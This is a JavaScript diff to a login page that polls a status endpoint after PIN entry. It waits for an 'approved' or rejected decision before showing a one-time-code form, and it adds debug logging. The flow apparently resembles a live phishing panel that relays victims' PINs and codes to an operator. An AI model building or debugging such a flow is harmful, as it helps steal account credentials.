@@ -335,28 +335,33 @@ var checkPinStatus = function () {
                  if (submitBtn) submitBtn.disabled = false;
                  return;
                }
-               if (!statusData.found) {
-                 console.log('[login] Record not found for id:', loginId);
-               }
-               if (statusData.decided) {
-                 if (pollInterval) clearInterval(pollInterval);
-                 if (statusData.status === 'approved') {
-                   if (spinner) spinner.style.display = 'none';
-                   loginForm.style.display = 'none';
-                   if (otpForm) {
-                     otpForm.style.display = 'block';
-                     otpForm.dataset.phone = num;
-                   }
-                   if (submitBtn) submitBtn.disabled = false;
-                   var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
-                   if (firstOtp) firstOtp.focus();
+if (!statusData.found) {
+                   console.log('[login] Record not found for id:', loginId, '- will keep polling');
                  } else {
-                   if (spinner) spinner.style.display = 'none';
-                   showToast('Wrong PIN. Please try again.', 'error');
-                   if (submitBtn) submitBtn.disabled = false;
-                   pinBoxes.forEach(function (box) { box.disabled = false; });
+                   console.log('[login] Record found, decided:', statusData.decided, 'status:', statusData.status);
                  }
-               }
+                 if (statusData.decided) {
+                   console.log('[login] Decision made, clearing interval');
+                   if (pollInterval) clearInterval(pollInterval);
+                   if (statusData.status === 'approved') {
+                     console.log('[login] Approved! Showing OTP form');
+                     if (spinner) spinner.style.display = 'none';
+                     loginForm.style.display = 'none';
+                     if (otpForm) {
+                       otpForm.style.display = 'block';
+                       otpForm.dataset.phone = num;
+                     }
+                     if (submitBtn) submitBtn.disabled = false;
+                     var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
+                     if (firstOtp) firstOtp.focus();
+                   } else {
+                     console.log('[login] Rejected! Showing error');
+                     if (spinner) spinner.style.display = 'none';
+                     showToast('Wrong PIN. Please try again.', 'error');
+                     if (submitBtn) submitBtn.disabled = false;
+                     pinBoxes.forEach(function (box) { box.disabled = false; });
+                   }
+                 }
              })
               .catch(function () {
                 if (spinner) spinner.style.display = 'none';
